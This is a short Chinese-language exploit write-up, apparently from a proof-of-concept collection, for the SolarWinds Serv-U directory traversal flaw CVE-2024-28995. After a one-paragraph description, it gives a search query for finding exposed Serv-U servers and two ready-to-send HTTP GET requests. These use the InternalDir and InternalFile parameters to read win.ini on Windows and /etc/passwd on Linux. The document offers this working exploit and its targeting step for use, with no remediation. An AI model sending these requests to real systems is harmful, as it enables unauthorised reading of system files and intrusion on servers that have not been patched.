# SolarWinds Serv-U 目录遍历漏洞(CVE-2024-28995)

### 1.漏洞描述

Serv-U 的目录遍历漏洞（CVE-2024-28995）是由于在处理路径时缺乏适当的验证。攻击者可以通过传递包含 “…/” 的路径段绕过路径验证，访问任意文件。

### 2.搜索语法

```plain
server="Serv-U"
```

### 3.漏洞复现

Windows-poc

```plain
GET /?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/d54ff660-fa8c-4d94-b208-0819eb5c156f)


Linux-poc

```plain
GET /?InternalDir=\..\..\..\..\etc&InternalFile=passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


```

![image](https://github.com/hardog123/poc-exp/assets/170905460/c2aec376-1962-4fdc-b848-881e0f6d2512)
